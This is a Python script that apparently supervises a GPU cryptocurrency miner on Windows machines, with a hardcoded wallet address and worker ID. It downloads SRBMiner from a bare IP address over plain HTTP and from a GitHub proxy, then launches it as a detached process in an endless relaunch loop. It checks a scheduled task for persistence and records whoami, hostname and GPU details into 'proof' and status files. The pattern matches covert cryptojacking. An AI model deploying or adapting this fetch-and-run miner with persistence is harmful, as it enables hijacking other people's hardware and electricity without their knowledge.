import os
import sys
import time
import hashlib
import subprocess
import urllib.request
import zipfile
import shutil


import os as _os
import sys as _sys
import time as _time
try:
    open(r"C:\pearl\boot.txt", "a").write("%s boot pid=%d py=%s\n" % (_time.strftime("%Y-%m-%dT%H:%M:%SZ", _time.gmtime()), _os.getpid(), _sys.executable))
except Exception:
    pass

B = r"C:\pearl"
WORKER = "000147"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
ZIP_SHA = "4bee6f04077b59275ff227864d2ebb231543c758480baf928446c011fe87b5f9"
EXE_SHA = "9d1da3dc8697480d468244bb8e46e2e2a9e432f551454384023c9fdb7267dbb3"
EXE = os.path.join(B, "SRBMiner-MULTI.exe")
ZIP = os.path.join(B, "srb.zip")
LOG = os.path.join(B, "srb-%s.log" % WORKER)
STATUS = os.path.join(B, "status.txt")
PROOF = os.path.join(B, "proof.txt")
SUPLOG = os.path.join(B, "stage.log")
LOCK = os.path.join(B, "stage.lock")
STOPF = os.path.join(B, "stop.flag")
RUNBAT = os.path.join(B, "run.bat")
GH = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-win64.zip"
URLS = ["http://217.15.164.237:8000/SRBMiner-Multi-3-8-9-win64.zip",
        "http://217.15.164.237:443/SRBMiner-Multi-3-8-9-win64.zip",
        "https://ghproxy.net/" + GH,
        GH]


def log(m):
    try:
        with open(SUPLOG, "a", encoding="utf-8", errors="replace") as f:
            f.write("%s %s\n" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), m))
    except Exception:
        pass


def sha256f(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        while True:
            b = f.read(1 << 20)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def run(cmd, tmo=90):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=tmo)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return "ERR %r" % (e,)


def dl(url, dest):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=90) as r, open(dest, "wb") as f:
            while True:
                b = r.read(1 << 20)
                if not b:
                    break
                f.write(b)
        return True
    except Exception as e:
        log("urllib_err %r %s" % (e, url))
    rc = subprocess.run(["curl.exe", "-L", "--max-time", "120", "-s", "-o", dest, url],
                        capture_output=True, text=True)
    return rc.returncode == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000000


def stage(prog):
    if os.path.exists(EXE):
        try:
            if sha256f(EXE) == EXE_SHA:
                return True, "cached_exe_ok"
        except Exception:
            pass
    used = ""
    okzip = False
    for u in URLS:
        prog("dl_try " + u)
        try:
            if os.path.exists(ZIP):
                os.remove(ZIP)
        except Exception:
            pass
        if not dl(u, ZIP):
            log("dl_fail " + u)
            prog("dl_fail " + u)
            continue
        try:
            got = sha256f(ZIP)
        except Exception as e:
            log("zip_hash_err %r" % (e,))
            continue
        log("dl_sha %s %s" % (got, u))
        prog("dl_sha %s %s" % (got[:16], u))
        if got == ZIP_SHA:
            okzip = True
            used = u
            break
        log("dl_sha_mismatch " + u)
    if not okzip:
        return False, "all_urls_failed"
    try:
        with zipfile.ZipFile(ZIP) as z:
            z.extractall(B)
    except Exception as e:
        return False, "unzip_err %r" % (e,)
    for root, dirs, files in os.walk(B):
        for fn in files:
            if fn.lower() == "srbminer-multi.exe":
                c = os.path.join(root, fn)
                try:
                    h = sha256f(c)
                except Exception:
                    continue
                if h == EXE_SHA:
                    try:
                        if os.path.abspath(c) != os.path.abspath(EXE):
                            shutil.copyfile(c, EXE)
                    except Exception as e:
                        return False, "copy_err %r" % (e,)
                    return True, "staged url=%s exe_sha=%s" % (used, h)
                log("exe_sha_mismatch %s %s" % (c, h))
    return False, "no_matching_exe"


def miner_present():
    out = run(["tasklist", "/fi", "imagename eq SRBMiner-MULTI.exe"], 60)
    return "SRBMiner-MULTI.exe" in out


def pid_alive(pid):
    if pid <= 0:
        return False
    out = run(["tasklist", "/fi", "pid eq %d" % pid, "/fo", "csv", "/nh"], 30)
    return str(pid) in out


def write_status(extra):
    L = ["=== pearl gpu-000109 status v4 " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " ==="]
    L.append("pid=%d supervisor=stage.py v4" % os.getpid())
    L.append(run(["hostname"], 30).strip())
    L.append(run(["nvidia-smi", "--query-gpu=name,uuid,memory.total,memory.free,utilization.gpu", "--format=csv,noheader"], 60).strip())
    L.append("--compute_apps--")
    L.append(run(["nvidia-smi", "--query-compute-apps=gpu_uuid,pid,process_name,used_memory", "--format=csv,noheader"], 60).strip())
    L.append("--tasklist--")
    L.append(run(["tasklist", "/fi", "imagename eq SRBMiner-MULTI.exe"], 60).strip())
    L.append("--miner_log_tail--")
    try:
        with open(LOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-14:]])
    except Exception as e:
        L.append("log_err %r" % (e,))
    L.append("--note--")
    L.append(extra)
    tmp = STATUS + ".new"
    with open(tmp, "w", encoding="utf-8", errors="replace") as f:
        f.write("\n".join(L) + "\n")
    try:
        os.replace(tmp, STATUS)
    except Exception:
        pass


def write_proof(stage_ok, stage_msg):
    L = ["=== pearl gpu-000109 proof v2 " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " ==="]
    L.append(run(["whoami"], 40).strip())
    L.append(run(["hostname"], 30).strip())
    L.append("python=%s" % sys.executable)
    L.append(run(["nvidia-smi", "-L"], 60).strip())
    L.append(run(["nvidia-smi", "--query-gpu=name,uuid,memory.total,memory.free,driver_version", "--format=csv,noheader"], 60).strip())
    L.append("stage_ok=%s msg=%s" % (stage_ok, stage_msg))
    L.append("zip_sha_expected=%s" % ZIP_SHA)
    L.append("exe_sha_expected=%s" % EXE_SHA)
    if os.path.exists(EXE):
        try:
            L.append("exe_sha_actual=%s" % sha256f(EXE))
        except Exception as e:
            L.append("exe_sha_err %r" % (e,))
    L.append("--schtasks--")
    L.append(run(["schtasks", "/query", "/tn", "pearl-%s-sup" % WORKER, "/fo", "LIST"], 60).strip()[:1500])
    L.append("--miner_running=%s--" % miner_present())
    L.append("--miner_log_tail--")
    try:
        with open(LOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-20:]])
    except Exception as e:
        L.append("log_err %r" % (e,))
    L.append("--stage_log_tail--")
    try:
        with open(SUPLOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-20:]])
    except Exception as e:
        L.append("stagelog_err %r" % (e,))
    tmp = PROOF + ".new"
    with open(tmp, "w", encoding="utf-8", errors="replace") as f:
        f.write("\n".join(L) + "\n")
    try:
        os.replace(tmp, PROOF)
    except Exception:
        pass


def main():
    os.makedirs(B, exist_ok=True)
    log("stage_v4_start pid=%d" % os.getpid())
    first = True
    while True:
        try:
            try:
                open(LOCK, "w").write(str(os.getpid()))
            except Exception:
                pass
            if os.path.exists(STOPF):
                log("stopflag_seen")
                run(["taskkill", "/f", "/im", "SRBMiner-MULTI.exe"], 60)
                write_status("stopped_by_stopflag")
                return
            notes = []
            def prog(m):
                notes.append(m)
                write_status(" ; ".join(notes[-4:]))
            prog("cycle_start")
            ok, msg = stage(prog)
            if first or not ok:
                log("stage ok=%s %s" % (ok, msg))
            if ok and not miner_present():
                log("spawn_miner")
                logf = open(os.path.join(B, "run.out"), "ab")
                subprocess.Popen(["cmd", "/c", RUNBAT], cwd=B, stdout=logf,
                                 stderr=subprocess.STDOUT,
                                 creationflags=0x00000008 | 0x00000200,
                                 close_fds=True)
            notes.append("stage_ok=%s stage_msg=%s miner=%s" % (ok, msg, miner_present()))
            write_status(" ; ".join(notes[-4:]))
            if first:
                write_proof(ok, msg)
                first = False
        except Exception as e:
            log("loop_exc %r" % (e,))
        time.sleep(60)


main()
